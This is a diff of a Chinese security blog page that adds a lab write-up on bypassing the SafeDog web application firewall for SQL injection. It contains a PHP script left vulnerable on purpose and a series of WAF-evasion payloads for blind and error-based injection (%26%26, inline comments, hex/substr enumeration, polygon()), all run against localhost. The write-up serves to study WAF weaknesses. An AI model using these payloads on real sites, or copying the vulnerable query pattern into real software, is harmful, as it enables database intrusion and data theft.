@@ -6,17 +6,42 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="爱好网络安全和渗透测试的九世......">
+    <meta name="description" content="前言在圈子见到某师傅过了安全狗然后注入，然后自己手痒也搭了个环境进行测试。期间搭建环境各种坑….不过后面还是有个不错的结果的    正文首先我是用phpstudy+安全狗4.0搭建的环境一开始找不到apache名称，按照网上的来整也不行（一堆重复的沙雕） 解决方法：12345以管理员权限运行cmd，进入apache/bin目录httpd -k install -n apache2.4以管理员权限运">
+<meta name="keywords" content="Writing">
 <meta property="og:type" content="article">
 <meta property="og:title" content="绕过安全狗新版进行SQL注入">
 <meta property="og:url" content="http://yoursite.com/2019/04/19/绕过安全狗新版进行SQL注入/index.html">
 <meta property="og:site_name" content="九世的博客">
-<meta property="og:description" content="爱好网络安全和渗透测试的九世......">
+<meta property="og:description" content="前言在圈子见到某师傅过了安全狗然后注入，然后自己手痒也搭了个环境进行测试。期间搭建环境各种坑….不过后面还是有个不错的结果的    正文首先我是用phpstudy+安全狗4.0搭建的环境一开始找不到apache名称，按照网上的来整也不行（一堆重复的沙雕） 解决方法：12345以管理员权限运行cmd，进入apache/bin目录httpd -k install -n apache2.4以管理员权限运">
 <meta property="og:locale" content="九世">
-<meta property="og:updated_time" content="2019-04-19T02:42:04.805Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpamNQ.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpaxK0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpamNQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EparDK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpdA2R.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Epd8xI.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpwFw8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpwQmV.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpwJfJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpBDRH.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpBcLt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpBOoT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpDkTK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Eprn4U.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Ep6lvQ.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Ep6N5V.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Ep6rr9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpccLj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpcHOJ.md.png">
+<meta property="og:image" content="http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!name*/">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Epgb38.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/Ep2HaR.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/EpOErR.png">
+<meta property="og:updated_time" content="2019-04-19T08:13:02.791Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="绕过安全狗新版进行SQL注入">
-<meta name="twitter:description" content="爱好网络安全和渗透测试的九世......">
+<meta name="twitter:description" content="前言在圈子见到某师傅过了安全狗然后注入，然后自己手痒也搭了个环境进行测试。期间搭建环境各种坑….不过后面还是有个不错的结果的    正文首先我是用phpstudy+安全狗4.0搭建的环境一开始找不到apache名称，按照网上的来整也不行（一堆重复的沙雕） 解决方法：12345以管理员权限运行cmd，进入apache/bin目录httpd -k install -n apache2.4以管理员权限运">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/19/EpamNQ.md.png">
     
     
         
@@ -64,7 +89,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/422926799">Proyectos</a></li>
+          <li><a href="http://github.com/422926799">Projectes</a></li>
          
           <li><a href="/Search">Search</a></li>
         
@@ -81,8 +106,8 @@
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
-      <span id="i-next" class="info" style="display:none;">Post Siguiente</span>
-      <span id="i-top" class="info" style="display:none;">Arriba</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
       <span id="i-share" class="info" style="display:none;">Compartir Post</span>
     </span>
     <br>
@@ -102,7 +127,7 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -130,13 +155,64 @@
 
 
       
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
 
     </div>
   </header>
   
 
   <div class="content" itemprop="articleBody">
-    
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在圈子见到某师傅过了安全狗然后注入，然后自己手痒<br>也搭了个环境进行测试。期间搭建环境各种坑….<br>不过后面还是有个不错的结果的</p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31311706&auto=1&height=66"></iframe>
+
+<p><img src="https://s2.ax1x.com/2019/04/19/EpamNQ.md.png" alt=""></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我是用phpstudy+安全狗4.0搭建的环境<br>一开始找不到apache名称，按照网上的来整也不行（一堆重复的沙雕）</p>
+<p>解决方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以管理员权限运行cmd，进入apache/bin目录</span><br><span class="line">httpd -k install -n apache2.4</span><br><span class="line"></span><br><span class="line">以管理员权限运行cmd，进入mysql/bin目录</span><br><span class="line">mysqld -k install -n MySQla</span><br></pre></td></tr></table></figure></p>
+<p>php代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=<span class="string">"root"</span>;</span><br><span class="line">$password=<span class="string">"root"</span>;</span><br><span class="line">$host=<span class="string">"localhost:3306"</span>;</span><br><span class="line">$database=<span class="string">"test"</span>;</span><br><span class="line">$con=mysqli_connect($host,$username,$password,$database);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">"Connect mysql faild...."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	$sql=<span class="string">"select * from demo where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $sql;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$cha=mysqli_query($con,$sql);</span><br><span class="line">	$jg=mysqli_fetch_array($cha);</span><br><span class="line">	var_dump($jg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>数据库表和字段如下<br><img src="https://s2.ax1x.com/2019/04/19/EpaxK0.png" alt=""></p>
+<p>尝试and 1=1和and 1=2毫无疑问被拦截了<br><img src="https://s2.ax1x.com/2019/04/19/EpamNQ.png" alt=""></p>
+<p>使用 %26%26 True 和 %26%26 False<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%26=&amp;</span><br><span class="line">&amp;=and</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EparDK.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpdA2R.png" alt=""></p>
+<p>使用Xor True 和 Xor False 也不拦<br><img src="https://s2.ax1x.com/2019/04/19/Epd8xI.md.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpwFw8.png" alt=""></p>
+<p>order内联注释就可以绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1/**//*!order*//**//*!by*//**//*!1*/</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpwQmV.md.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpwJfJ.png" alt=""></p>
+<p>union select卡住了。。。怎么也绕不过，后面改去整盲注了<br><img src="https://s2.ax1x.com/2019/04/19/EpBDRH.md.png" alt=""></p>
+<p>and length(database())=8被杀，后面看了网上的文章，@@version database/**/() 这样写不会被杀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (length(database/**/())=4)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpBcLt.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (ascii(@@version)=53)</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpBOoT.png" alt=""></p>
+<p>判断有多少个表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!table_name*/) from information_schema.tables where table_schema=0x74657374))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpDkTK.png" alt=""></p>
+<p>猜表，由于这里使用ascii会被拦截，还有table_name也拦截<br><img src="https://s2.ax1x.com/2019/04/19/Eprn4U.md.png" alt=""></p>
+<p>使用hex函数代替ascii函数，使用count(/<em>!table_name</em>/)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!table_name*/) from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1)))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/Ep6lvQ.md.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!table_name*/) from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1))=64)</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/04/19/Ep6N5V.png" alt=""></p>
+<p>猜字段个数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (2=(select count(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/Ep6rr9.png" alt=""></p>
+<p>猜字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F limit 0,1),1,1)))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpccLj.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!column_name*/) from information_schema.columns where table_name=0x64656D6F limit 0,1),1,1))=69)v</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/04/19/EpcHOJ.md.png" alt=""></p>
+<p>猜字段内容有多少个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!name*/) from demo))</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://127.0.0.1/sqli.php?id=1 %26%26 (1=(select count(/*!name*/" alt=""> from demo)))</p>
+<p>猜字段内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 (hex(substr((select concat(/*!name*/) from demo limit 0,1),1,1))=64)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/Epgb38.png" alt=""></p>
+<p>报错注入绕过安全狗<br>修改php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=<span class="string">"root"</span>;</span><br><span class="line">$password=<span class="string">"root"</span>;</span><br><span class="line">$host=<span class="string">"localhost:3306"</span>;</span><br><span class="line">$database=<span class="string">"test"</span>;</span><br><span class="line">$con=mysqli_connect($host,$username,$password,$database);</span><br><span class="line"><span class="keyword">if</span>(!$con)&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">"Connect mysql faild...."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	$sql=<span class="string">"select * from demo where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $sql;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	$cha=mysqli_query($con,$sql);</span><br><span class="line">	$jg=mysqli_fetch_array($cha);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($jg))&#123;</span><br><span class="line">		$error=mysqli_error($con);</span><br><span class="line">		<span class="keyword">echo</span> $error;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	var_dump($jg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>updatexml(1,,1) #安全狗正则匹配(1,内容,1)不论里面是什么都杀,还有过滤concat(0x7e,,0x7e) 总之过滤了逗号，然后各种报错注入折腾了半天<br><img src="https://s2.ax1x.com/2019/04/19/Ep2HaR.md.png" alt=""></p>
+<p>然后从印象笔记翻出一篇文章= =里面用的操作可真骚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1-a()</span><br></pre></td></tr></table></figure></p>
+<p>用一个不存在的函数即可获取数据库名<br><img src="https://s2.ax1x.com/2019/04/19/EpOErR.png" alt=""></p>
+<p>输入一个存在的列名即可获取：数据库名，表名，字段名<br>可以拿sqlmap跑字段名的字典配合burp爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli.php?id=1 %26%26 polygon(id)</span><br></pre></td></tr></table></figure></p>
+<p>….搞不出了搞不出了。。，告辞</p>
+<p><b>转载请声明：转自422926799.github.io</b></p>
+
   </div>
 </article>
 
@@ -156,7 +232,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/422926799">Proyectos</a></li>
+          <li><a href="http://github.com/422926799">Projectes</a></li>
          
           <li><a href="/Search">Search</a></li>
         
@@ -164,7 +240,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -184,10 +260,10 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
     </div>
 
   </div>
@@ -208,7 +284,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/422926799">Proyectos</a></li>
+          <li><a href="http://github.com/422926799">Projectes</a></li>
          
           <li><a href="/Search">Search</a></li>
         
